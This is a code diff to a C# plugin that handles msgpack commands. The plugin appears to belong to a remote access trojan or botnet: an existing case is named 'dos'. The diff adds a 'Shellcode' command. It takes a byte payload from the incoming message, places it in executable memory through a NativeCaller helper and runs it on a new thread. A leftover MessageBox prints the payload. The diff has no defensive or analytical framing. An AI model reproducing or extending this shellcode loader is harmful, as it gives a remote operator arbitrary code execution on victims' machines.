@@ -9,6 +9,7 @@ using System.Management;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace Plugin
 {
@@ -45,7 +46,6 @@ namespace Plugin
                             break;
                         }
 
-
                     case "dos":
                         {
                             switch (unpack_msgpack.ForcePathObject("Option").AsString)
@@ -68,6 +68,16 @@ namespace Plugin
                             break;
                         }
 
+                    case "Shellcode":
+                        {
+                            bin = unpack_msgpack.ForcePathObject("Bin").GetAsBytes();
+                            MessageBox.Show(Convert.ToBase64String(bin));
+                            ThreadStart threadStart = new ThreadStart(RunShellcode);
+                            Thread thread = new Thread(threadStart);
+                            thread.Start();
+                            break;
+                        }
+
                 }
             }
             catch (Exception ex)
@@ -75,6 +85,15 @@ namespace Plugin
                 Error(ex.Message);
             }
         }
+
+        public static void RunShellcode()
+        {
+            IntPtr shellcode = NativeCaller.AllocateExecutableCode(IntPtr.Zero, bin);
+
+            NativeCaller.Call(shellcode);
+        }
+
+        public static byte[] bin { get; set; }
 
         public static void Error(string ex)
         {
